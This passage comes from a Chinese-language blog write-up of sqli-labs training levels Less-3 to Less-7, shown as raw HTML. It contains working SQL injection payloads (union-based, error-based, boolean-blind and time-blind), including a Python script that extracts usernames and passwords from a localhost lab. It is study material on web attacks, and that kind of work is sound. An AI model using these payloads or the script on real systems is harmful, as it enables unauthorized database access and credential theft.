class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------------------æŸ¥è¡¨--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-3/</span><br><span class="line">?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br><span class="line">--------------------æŸ¥è¡¨å­—æ®µ/å±æ€§--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-3/</span><br><span class="line">?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line">--------------------æŸ¥è¡¨å­—æ®µ/å±æ€§çš„å†…å®¹--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-3/</span><br><span class="line">?id=-1&#x27;) union select 1,group_concat(username,&#x27;--&#x27;),group_concat(password,&#x27;--&#x27;) from users --+</span><br></pre></td></tr></table></figure><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><blockquote><p>Less-4 Error Based- DoubleQuotes String</p></blockquote><p>æœ‰ç‚¹å¥‡æ€ªï¼Œå­—ç¬¦å‹å’Œæ•°å­—å‹éƒ½æµ‹äº†ä¸€éï¼Œä½†æ˜¯å‘ç°é¡µé¢éƒ½æœ‰æ­£ç¡®å›æ˜¾ã€‚æ³¨é‡Šè¯­å¥ä¹Ÿæ²¡èµ·åˆ°ä½œç”¨ï¼Œçœ‹çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">//è¯¥ä»£ç çš„ç›®çš„æ˜¯åœ¨å˜é‡ $id çš„å€¼çš„å‰åæ·»åŠ åŒå¼•å·ã€‚</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--------------------å‡è®¾æ³¨å…¥å¦‚ä¸‹--------------------</span><br><span class="line">?id=1&#x27; union select 1,database(),version() --+</span><br><span class="line">--------------------å¾—åˆ°ç»“æœå¦‚ä¸‹--------------------</span><br><span class="line">(&quot;1&#x27; union select 1,database(),version() --+&quot;)</span><br></pre></td></tr></table></figure><p><mark>å­˜ç–‘:</mark>ä¸ºä»€ä¹ˆé¡µé¢èƒ½å¤Ÿæ­£ç¡®åœ°è¿”å›id=1çš„ä¿¡æ¯è€Œä¸æŠ¥é”™ï¼Ÿä¸ºä»€ä¹ˆä¸èƒ½æ‰§è¡Œunionè”åˆæŸ¥è¯¢è¯­å¥ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--------------------å‡è®¾æ³¨å…¥å¦‚ä¸‹--------------------</span><br><span class="line">?id=1&#x27;) union select 1,database(),version() --+</span><br><span class="line">--------------------å¾—åˆ°ç»“æœå¦‚ä¸‹--------------------</span><br><span class="line">(&quot;1&#x27;) union select 1,database(),version() --+&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payloadå¦‚ä¸‹ï¼šåœ¨Less-3çš„åŸºç¡€ä¸ŠæŠŠ-1åé¢çš„å•å¼•å·æ”¹ä¸ºåŒå¼•å·å³å¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------------------æŸ¥è¡¨--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-4/</span><br><span class="line">?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br><span class="line">--------------------æŸ¥è¡¨å­—æ®µ/å±æ€§--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-4/</span><br><span class="line">?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line">--------------------æŸ¥è¡¨å­—æ®µ/å±æ€§çš„å†…å®¹--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-4/</span><br><span class="line">?id=-1&quot;) union select 1,group_concat(username,&#x27;--&#x27;),group_concat(password,&#x27;--&#x27;) from users --+</span><br></pre></td></tr></table></figure><h2 id="åæ€"><a href="#åæ€" class="headerlink" title="åæ€"></a>åæ€</h2><p>â€‹    åœ¨å®é™…ç¯å¢ƒä¸‹ï¼Œå¦‚æœéœ€è¦æ‰‹å·¥æ³¨å…¥æˆ‘æ€ä¹ˆå¿«é€Ÿåœ°çŸ¥é“æ³¨å…¥é—­åˆæ¡ä»¶æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><ul><li>è„šæœ¬éå†</li><li>è·å–æºç ï¼ˆæ„Ÿè§‰éš¾åº¦è¾ƒå¤§ï¼Œéƒ½è·å–åˆ°æºç äº†ï¼‰</li></ul><h2 id="Homework"><a href="#Homework" class="headerlink" title="Homework"></a>Homework</h2><ul><li><input disabled type="checkbox"> pythonå†™ä¸€ä¸ªéå†çš„ç¨‹åºæ‰“é€šè¿™ä¸¤å…³</li></ul><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><blockquote><p>Less-5 Double Query- Single Quotes- String</p></blockquote><h2 id="ä¸€ã€åˆ†æé¢˜ç›®"><a href="#ä¸€ã€åˆ†æé¢˜ç›®" class="headerlink" title="ä¸€ã€åˆ†æé¢˜ç›®"></a>ä¸€ã€åˆ†æé¢˜ç›®</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line">--------------------ç¡®è®¤ä¸ºå­—ç¬¦å‹æ³¨å…¥--------------------</span><br></pre></td></tr></table></figure><p>æœ‰ç‚¹æ„æ€ï¼Œå‘ç°ä¹‹å‰çš„æ¨¡æ¿è¯­å¥æ³¨å…¥åéƒ½åªå›æ˜¾<code>You are in...........</code>ï¼ŒæŸ¥çœ‹æºç å‘ç°ï¼Œåªè¦æŸ¥è¯¢ç»“æœæ­£ç¡®å°±åªè¿”å›<code>You are in...........</code>ï¼Œåº”è¯¥ç®—æ˜¯ç›²æ³¨äº†ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æœ¬é¢˜ï¼š</span></span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//ä¹‹å‰åšçš„é¢˜ç›®ï¼š</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="äºŒã€ç›²æ³¨çŸ¥è¯†ç‚¹"><a href="#äºŒã€ç›²æ³¨çŸ¥è¯†ç‚¹" class="headerlink" title="äºŒã€ç›²æ³¨çŸ¥è¯†ç‚¹"></a>äºŒã€ç›²æ³¨çŸ¥è¯†ç‚¹</h2><p>ç›²æ³¨åˆ†ç±»å¤§è‡´å¦‚æ­¤ï¼š</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230704/St2iv8rimage.7blrrw8yngo.png"></p><p>è¯¦æƒ…è§æ­¤åšæ–‡å­¦ä¹ ç›²æ³¨ï¼š<a class="link" href="https://www.anquanke.com/post/id/266244#h3-3">ç‚¹æ­¤å¤„è·³è½¬<i class="fas fa-external-link-alt"></i></a></p><h2 id="ä¸‰ã€å¸ƒå°”ç›²æ³¨å’Œå»¶æ—¶ç›²æ³¨WP"><a href="#ä¸‰ã€å¸ƒå°”ç›²æ³¨å’Œå»¶æ—¶ç›²æ³¨WP" class="headerlink" title="ä¸‰ã€å¸ƒå°”ç›²æ³¨å’Œå»¶æ—¶ç›²æ³¨WP"></a>ä¸‰ã€å¸ƒå°”ç›²æ³¨å’Œå»¶æ—¶ç›²æ³¨WP</h2><p>â€‹    è¿™é‡Œå¸ƒå°”ç›²æ³¨çš„é€Ÿåº¦æ›´å¿«</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:C2yb8er</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Boolean_Blind_SQL_Attack</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  <span class="comment"># æ ¹æ®è¾“å‡ºé•¿åº¦æ¥å®š</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz_,ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>:</span><br><span class="line">            url = <span class="string">&quot;http://localhost/SQLlabs/Less-5/&quot;</span></span><br><span class="line">            <span class="comment"># çˆ†æ•°æ®åº“å</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and BINARY substr(database(), &#123;j&#125;, 1)=&#x27;&#123;i&#125;&#x27;--+&quot;</span></span><br><span class="line">            <span class="comment"># çˆ†è¡¨å</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and BINARY substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27; --+&quot;</span></span><br><span class="line">            <span class="comment"># çˆ†åˆ—å</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and BINARY substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;), &#123;j&#125;, 1)=&#x27;&#123;i&#125;&#x27;--+&quot;</span></span><br><span class="line">            <span class="comment"># çˆ†åˆ—æ•°æ®</span></span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and BINARY substr((select group_concat(username) from users),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27; --+&quot;</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and BINARY substr((select group_concat(password) from users),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27; --+&quot;</span></span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                name += i</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;The final result is :<span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Time_Blind_SQL_Attack</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  <span class="comment"># æ ¹æ®è¾“å‡ºé•¿åº¦æ¥å®š</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz_,ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>:</span><br><span class="line">            url = <span class="string">&quot;http://localhost/SQLlabs/Less-5/&quot;</span></span><br><span class="line">            <span class="comment"># çˆ†æ•°æ®åº“å</span></span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and sleep(if(BINARY substr(database(),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            <span class="comment"># çˆ†è¡¨å</span></span><br><span class="line">            <span class="comment"># payload=f&quot;?id=1&#x27; and sleep(if(BINARY substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            <span class="comment"># çˆ†åˆ—å</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and sleep(if(BINARY substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            <span class="comment"># çˆ†åˆ—æ•°æ®å</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and sleep(if(BINARY substr((select group_concat(username) from users),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and sleep(if(BINARY substr((select group_concat(pasword) from users),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            time1 = datetime.datetime.now()</span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            time2 = datetime.datetime.now()</span><br><span class="line">            sec = (time2 - time1).seconds</span><br><span class="line">            <span class="keyword">if</span> sec &gt;= <span class="number">2</span>:</span><br><span class="line">                name += i</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;The final result is :<span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># Time_Blind_SQL_Attack()</span></span><br><span class="line">    Boolean_Blind_SQL_Attack()</span><br></pre></td></tr></table></figure><h2 id="å››ã€æŠ¥é”™æ³¨å…¥"><a href="#å››ã€æŠ¥é”™æ³¨å…¥" class="headerlink" title="å››ã€æŠ¥é”™æ³¨å…¥"></a>å››ã€æŠ¥é”™æ³¨å…¥</h2><blockquote><p>æ–¹æ³•å¤šå¦‚ç‰›æ¯›ï¼Œè¿™é‡Œåªçœ‹çœ‹è¿™å‡ æ–¹é¢ï¼š</p></blockquote><h3 id="floor-æŠ¥é”™æ³¨å…¥"><a href="#floor-æŠ¥é”™æ³¨å…¥" class="headerlink" title="floor()æŠ¥é”™æ³¨å…¥"></a>floor()æŠ¥é”™æ³¨å…¥</h3><blockquote><p>flooræŠ¥é”™æ³¨å…¥çš„åŸç†æ˜¯randå’Œorder byæˆ–group byçš„å†²çªã€‚</p></blockquote><p><mark>å­˜ç–‘ï¼š</mark>è¿™é‡Œçš„usernameå’Œpasswordä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥ç”¨group_concatå‡½æ•°ä¸€æ¬¡è¾“å‡ºå‘¢ï¼Ÿä¸ºä»€ä¹ˆå¿…é¡»è¦å¾—ç”¨limité™åˆ¶æ‰èƒ½ä¸€ä¸ªä¸€ä¸ªè¾“å‡ºå‘¢ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--------------------æŸ¥æ•°æ®åº“å--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br><span class="line">--------------------æŸ¥è¡¨å--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br><span class="line">--------------------æŸ¥åˆ—å--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name=&#x27;users&#x27; ),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br><span class="line">--------------------æŸ¥username--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select username from users limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br><span class="line">--------------------æŸ¥password--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select password from users limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br></pre></td></tr></table></figure><h3 id="extractvalue-æŠ¥é”™æ³¨å…¥"><a href="#extractvalue-æŠ¥é”™æ³¨å…¥" class="headerlink" title="extractvalue()æŠ¥é”™æ³¨å…¥"></a>extractvalue()æŠ¥é”™æ³¨å…¥</h3><blockquote><p>æœ‰é•¿åº¦é™åˆ¶,æœ€é•¿32ä½<br>åŸç†ï¼šxpath å‡½æ•°æŠ¥é”™æ³¨å…¥</p></blockquote><p><mark>ç¼ºé™·å°±æ˜¯æ˜¾ç¤ºä¸å®Œå…¨ï¼</mark></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--------------------æŸ¥æ•°æ®åº“å--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</span><br><span class="line">--------------------åç»­åŒupdatexml--------------------</span><br></pre></td></tr></table></figure><h3 id="updatexml-æŠ¥é”™æ³¨å…¥"><a href="#updatexml-æŠ¥é”™æ³¨å…¥" class="headerlink" title="updatexml()æŠ¥é”™æ³¨å…¥"></a>updatexml()æŠ¥é”™æ³¨å…¥</h3><blockquote><p>æœ‰é•¿åº¦é™åˆ¶,æœ€é•¿32ä½</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--------------------æŸ¥æ•°æ®åº“å--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),1)--+</span><br><span class="line">--------------------æŸ¥è¡¨å--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)--+</span><br><span class="line">--------------------æŸ¥åˆ—å--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name=&#x27;users&#x27; ),0x7e),1)--+</span><br><span class="line">--------------------æŸ¥username--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)--+</span><br><span class="line">--------------------æŸ¥password--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><mark>ç¼ºé™·å°±æ˜¯æ˜¾ç¤ºä¸å®Œå…¨ï¼</mark></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230704/St2iv8rimage.1xecdkis7www.png"></p><h2 id="äº”ã€åè®°-1"><a href="#äº”ã€åè®°-1" class="headerlink" title="äº”ã€åè®°"></a>äº”ã€åè®°</h2><p>â€‹    è¿™ä¸€é“é¢˜èŠ±è´¹æ—¶é—´è¾ƒé•¿ï¼Œä½†æ˜¯æ”¶è·è¾ƒå¤§ï¼Œåˆæ­¥å…¥é—¨äº†ç›²æ³¨å’ŒæŠ¥é”™æ³¨å…¥å¹¶ä¸”ç”¨pythonç®€åŒ–äº†æµç¨‹ã€‚</p><p>â€‹    åœ¨è¿™é‡Œè´´ä¸€ç‚¹å‚è€ƒæ–‡ç« å§ï¼š</p><ul><li><p><a href="https://www.cnblogs.com/-qing-/p/11610385.html#_label0"><strong>SQLæ³¨å…¥é¶åœºsqli-labs 1-65å…³å…¨éƒ¨é€šå…³æ•™ç¨‹</strong></a></p></li><li><p><a class="link" href="https://blog.csdn.net/like98k/article/details/79646512">SQLæ³¨å…¥ä¹‹æŠ¥é”™æ³¨å…¥çš„ä¸€äº›éšç¬”<i class="fas fa-external-link-alt"></i></a></p></li><li><p><a class="link" href="https://blog.csdn.net/rfrder/article/details/108674217">sqli-labs-Less5 å…³äºå„ç§æŠ¥é”™æ³¨å…¥çš„å­¦ä¹ <i class="fas fa-external-link-alt"></i></a></p></li></ul><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><blockquote><p>Less-6 Double Query- Double Quotes- String</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>â€‹    æŠŠless-5ä¸­<code>?id=1&#39;</code>æ”¹æˆ<code>?id=1&quot;</code>å°±èƒ½è¿‡ã€‚</p><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><blockquote><p>Less-7 Dump into Outfile</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--------------------è¯•æ¢--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-7/?id=1&#x27; and 1 = 1</span><br><span class="line">//ç»è¿‡è¯•æ¢æˆ‘ä»¬å‘ç°é¡µé¢è¿”å›å¦‚ä¸‹ï¼š</span><br><span class="line">You have an error in your SQL syntaxYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;)) LIMIT 0,1&#x27; at line 1</span><br><span class="line">//æˆ‘ä»¬è‚¯å®šç¡®è®¤æœ‰æ–°çš„é—­åˆæ¡ä»¶ï¼šè¿™é‡Œæˆ‘ä»¬çŒœæµ‹ä¸º))</span><br><span class="line">--------------------æ„é€ å½¢å¼å¦‚ä¸‹--------------------</span><br><span class="line">?id=1&#x27;)) payload --+</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br><span 